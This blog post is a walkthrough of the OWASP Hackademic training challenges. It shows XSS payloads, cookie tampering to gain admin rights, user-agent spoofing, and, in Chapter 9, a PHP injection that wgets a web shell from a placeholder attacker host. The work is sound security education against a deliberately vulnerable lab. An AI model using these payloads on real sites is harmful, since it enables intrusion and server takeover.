---
layout: post
title: Other - OWASP Hackademic
---

Site: <a href="https://www.owasp.org/index.php/OWASP_Hackademic_Challenges_Project">OWASP - Hackademic</a> <br>
Situation: Basic Web Application Exploitation<br><br>

A initial look at these challenges is they expect a exact solution for each
challenge. Which for many is rather annoying. However due to the difficulty of
these challenges it was roughly 30 minutes of annoyance.

Each challenge contains a small scenario to give you some purpose to the task
however I will skip the storyline elements in this write up.

#### Chapter 1
- - - - - - -

First challenge we need to gain access to the main site, find an individuals email
whos birthday is friday the 13th and send them a message using the main site.

At first we are presented with the initial screen.

![Embeded](/images/hackademic/screen1.png)
[FullSize](/images/hackademic/screen1.png)

At first try we enter random data into the username and input fields and we are
given a simple "Wrong code or Password" screen.

Our next step is to look at the html source of our login page and see if there
is any useful information. When we look at the source we see the following.

{% highlight html %}
-- SNIP --
<p><i><span class="style3"><span lang="el">Anonymous Corporation since 1990. Reg. No: K7827-232-210B/1990</span></span><b><font color="#808000">
   </font>&nbsp;<font color="#FFFFFF"><span lang="el">&nbsp;</span>white, rabbit</font></b></i>
</p>
<form action="./main/index.php" method="post">
<p align="center">Enter Code / Password
   <input type="text" name="name1" size="20">
   <input type="text" name="name2" size="20">
</p>
-- SNIP --
{% endhighlight %}

This snippet looks innocent enough however we notice the following sentence.

{% highlight bash %}
white, rabbit
{% endhighlight %}

If we enter that into the username and password field we are presented with the
following.

![Embeded](/images/hackademic/screen2.png)
[FullSize](/images/hackademic/screen2.png)

Looking around a bit the area of interest is the "Mailbox Special Clients Mailbox"
page. It is the only page that contains a image separate from the main template.

![Embeded](/images/hackademic/screen3.png)
[FullSize](/images/hackademic/screen3.png)

If we inspect the image we get a secret path.

![Embeded](/images/hackademic/screen4.png)
[FullSize](/images/hackademic/screen4.png)

After navigating to that path in our web browser we find that there is a text file
called emails.txt. If we open it we find the email we are looking for.

![Embeded](/images/hackademic/screen5.png)
[FullSize](/images/hackademic/screen5.png)

After we enter the email we are given our congratulations message.

#### Chapter 2
- - - - - - -

The next challenge is we have to get into the admin area of a website.

After initial loading we are presented with the following screen.

![Embeded](/images/hackademic/screen6.png)
[FullSize](/images/hackademic/screen6.png)

If we give the area random data nothing happens. So we go straight to the source.
Where we find the following snippet of javascript.

{% highlight javascript %}
function GetPassInfo(){
  var madhouuuuuuuseeee = "givesacountinatoap lary"

  -- SNIP --
  var a = madhouuuuuuuseeee.charAt(0);  
  var d = madhouuuuuuuseeee.charAt(3);
  var r = madhouuuuuuuseeee.charAt(16);
  var b = madhouuuuuuuseeee.charAt(1);  

  -- SNIP --
  var p = madhouuuuuuuseeee.charAt(4)
  var Wrong = (d+""+j+""+k+""+d+""+x+""+t+""+o+""+t+""+h+""+i+""+l+""+j+""+t+""+k+""+i+""+t+""+s+""+q+""+f+""+y)

  if (document.forms[0].Password1.value == Wrong)
    location.href="index.php?Result=" + Wrong;
  }
{% endhighlight %}

The interesting line is the following.

{% highlight javascript %}
if (document.forms[0].Password1.value == Wrong)
  location.href="index.php?Result=" + Wrong;
}
{% endhighlight %}

It is checking the password field to the variable Wrong that is made up from
the madhouuuuuuuseeee variable containing the string "givesacountinatoap lary".

There is two ways we can do this. We can manually find what each character is
and then put the correct value together manually. Or we can set a breakpoint in
the client side javascript and get the value. We will go with the latter.

Using firebug we can set a break point on the if check and get the value of the
Wrong variable.

![Embeded](/images/hackademic/screen7.png)
[FullSize](/images/hackademic/screen7.png)

After pressing enter it hits our breakpoint and we have the value. A simple
copy and paste gives us our congratulations message.

#### Chapter 3
- - - - - - -

Chapter three is a simple xss test. Upon initial load we are presented with the
following.

![Embeded](/images/hackademic/screen8.png)
[FullSize](/images/hackademic/screen8.png)

The injection can be done using the following string.

{% highlight html %}
<script>alert("XSS!");</script>
{% endhighlight %}

After entering it we are given our congratulations message.

#### Chapter 4
- - - - - - -

Chapter four is also a simple xss however it took me a bit of time to figure out
what it was asking for. Only because it says that filtering is going on. However
what they meant was filtering is being done against the string "XSS!" and not the
injection type.

![Embeded](/images/hackademic/screen9.png)
[FullSize](/images/hackademic/screen9.png)

The injection can be done using the following string.

{% highlight html %}
<script>alert(String.fromCharCode(88,83,83,33))</script>
{% endhighlight %}

After entering it we are given our congratulations message.

#### Chapter 5
- - - - - - -

In this challenge only users utilizing the p0wnBrowser can access the page.
For anyone unfamiliar with how webservers identify individual web browsers.
Upon connection each browser sends over its User Agent.

All that is needed to get past this challenge is to modify the user agent sent
from firefox. We can do this easily by installing a addon called "User Agent Switcher".

Upon initial loading we are presented with the following page.

![Embeded](/images/hackademic/screen10.png)
[FullSize](/images/hackademic/screen10.png)

All we need to do is add a new user agent to the agent switcher.

![Embeded](/images/hackademic/screen11.png)
[FullSize](/images/hackademic/screen11.png)

After switching to the user agent and reloading we are given our congratulations
screen.

#### Chapter 6
- - - - - - -

The next challenge requires us to login to another protected site.

At initial loading we are presented with the following page.

![Embeded](/images/hackademic/screen12.png)
[FullSize](/images/hackademic/screen12.png)

Entering a random password we are given a prompt telling us we have entered
a incorrect password.

If we look at the source we are given the following

{% highlight html %}
<font color="green">
<br><br><br>
<script language="JavaScript">
document.write(unescape("%3C%68%74%6D%6C%20%78%6D -- SNIP --"))
</script>
<noscript>JavaScript is required to view this page.</noscript>
{% endhighlight %}

From this we can see that the entire page is being rendered from the data in
between the javascript unescape("") function. The unescape function is used
to decode url encoded data.

To do this easily we will utilize the built in javascript console to run the
unescape(""); function with all of the data from the source to get a readable
version of it.

![Embeded](/images/hackademic/screen13.png)
[FullSize](/images/hackademic/screen13.png)

After running the command in the console we get readable html. After looking
through the source we come across this function.

{% highlight html %}
<script>
function GetPassInfo(){
		if (document.forms[0].PassPhrase.value == 'easyyyyyyy!')
    	 		location.href="index.php?Result=easyyyyyyy!";
    	 	else
    	 		alert("Wrong Code...!!");
	}
</script>
{% endhighlight %}

We see the password it expects is easyyyyyyy!. After entering the password it
expects we get our congratulations message.

#### Chapter 7
- - - - - - -

In this scenario we need to gain access to protected web panel and elevate to
admin status.

At first we are presented with the following website.

![Embeded](/images/hackademic/screen14.png)
[FullSize](/images/hackademic/screen14.png)

After entering random data we are given a rough screen that states the following.

{% highlight bash %}
**************************************************

ERRONEOUS IMPORT OF DATA!

Please try again!

**************************************************
{% endhighlight %}

So obviously we are missing something. After examining the source of the login
page nothing sticks out immediately. However if we look closer there are two
seperate directories where images are being grabbed from. First being the
/index-files/ and the second being /index_files/ .

If we try and go to /index-files/ we are given a no such directory error.
However if we navigate to /index_files/ we are presented with a directory listing
and a interesting file called lastlogin.txt. Show below.

![Embeded](/images/hackademic/screen15.png)
[FullSize](/images/hackademic/screen15.png)

We notice that the user "Irene" logged in. Going to the login page and entering
the name "Irene" takes us to the following page.

![Embeded](/images/hackademic/screen16.png)
[FullSize](/images/hackademic/screen16.png)

At first glance there is nothing to investigate. No forms to populate and source
shows nothing. However if we take a look at our current cookies with firebug
we notice a new one has been placed by the site.

![Embeded](/images/hackademic/screen17.png)
[FullSize](/images/hackademic/screen17.png)

Two values are being set by the webserver. First being the userlevel which is
just "user" and the second being the username. By changing the userlevel in the
cookie we are able to elevate our permissions from user to admin.

![Embeded](/images/hackademic/screen18.png)
[FullSize](/images/hackademic/screen18.png)

If we go back to the login page and enter Irene again with our modified cookie.
We are given our congratulations message.

#### Chapter 8
- - - - - - -

In this challenge we are given a simple webshell that we must elevate our permissions
in. At first load we get the following.

![Embeded](/images/hackademic/screen19.png)
[FullSize](/images/hackademic/screen19.png)

After typing help we are limited to a few commands however after running "ls"
we are show that there is a file named "b64.txt" in our current web directory.
By navigating to that file in our web browser we get the following block of text.

{% highlight bash %}
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NClVzZXJuYW1lOiByb290IA0KUGFzc3dvcmQ6IGcwdHIwMHQNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
{% endhighlight %}

Generally b64 is a common abbreviation of base64 encoding. After running
the text block through a base64 decoder we get the following.

{% highlight bash %}
--------------------------------------------
Username: root
Password: g0tr00t
--------------------------------------------
{% endhighlight %}

By using the su command in the webshell and entering our newly found credentials
we are given our congratulations message.

#### Chapter 9
- - - - - - -

This chapter was infact the hardest out of the bunch. If only because none of
the other chapters even hint at the possible exploit. To exploit this machine
it is expected that you use a remote file inclusion attack via your web browsers
user agent. We are expected to exploit the web application.

At first load we get the following page.

![Embeded](/images/hackademic/screen20.png)
[FullSize](/images/hackademic/screen20.png)

After poking around for the obvious vulnerabilities nothing seems to work. However
there is a chance that for whatever reason maybe the blog is saving and executing
the user agent that a specific post comes from. I have honestly never seen this
in any real testing howerver it is the solution to this challenge.

Knowing we have to upload a shell and that we have a shell available at the fake
"http://www.really_nasty_hacker.com/shell.txt" website we create the following
user agent containing the php system call code to wget our script.

{% highlight php %}
<?system("wget http://www.really_nasty_hacker.com/shell.txt");?>
{% endhighlight %}

![Embeded](/images/hackademic/screen21.png)
[FullSize](/images/hackademic/screen21.png)

After changing our user agent and submitting a new comment. We get confirmation
that our shell was uploaded and is now stored at "tyj0rL.php" in our web directory.

Once we load the shell and run a ls command there are two files in our web directory.
"adminpanel.php and sUpErDuPErL33T.txt". Opening sUpErDuPErL33T.txt we are given
a username and password combination. Copying those down and entering them
into the adminpanel.php reveals our congratulations message.

![Embeded](/images/hackademic/screen22.png)
[FullSize](/images/hackademic/screen22.png)

#### Chapter 10
- - - - - - -

Last challenge of the set. In this challenge we need to gain entry and a serial
number to join the "n1nJ4.n4x0rZ.CreW!". Yes i know i said i was gonna ignore the
specific scenario details but thought this one was funny.

At first we are presented with the following.

![Embeded](/images/hackademic/screen23.png)
[FullSize](/images/hackademic/screen23.png)

If we enter random information into the login field we are presented with a popup
that says we have to try harder to be part of the crew. After looking at the source
we see the following html.

{% highlight html %}
<hr>
<form method="post" action="">
<input type="hidden" name="LetMeIn" value="False">
<input type="password" name="password">
<input type="submit" name="login" value="Login">
<h3><font color=red>...sh0w m3h y0ur n1nJ4 h4x0r sKiLlz...</h3></font>
<hr>
{% endhighlight %}

We notice there is a hidden field titled LetMeIn that is the value "False". Using
firefox's inline editor we can change it to True.

![Embeded](/images/hackademic/screen24.png)
[FullSize](/images/hackademic/screen24.png)

After changing it and submitting a random login name we are given the following
urlencoded string

{% highlight bash %}
%53%65%72%69%61%6C%20%4E%75%6D%62%65%72%3A%20%54%52%56%4E%2D%36%37%51%32%2D%52%55%39%38%2D%35%34%36%46%2D%48%31%5A%54
{% endhighlight %}

After decoding the string we get the following

{% highlight bash %}
Serial Number: TRVN-67Q2-RU98-546F-H1ZT
{% endhighlight %}

After entering the serial number in the next field we get our congratulations message.
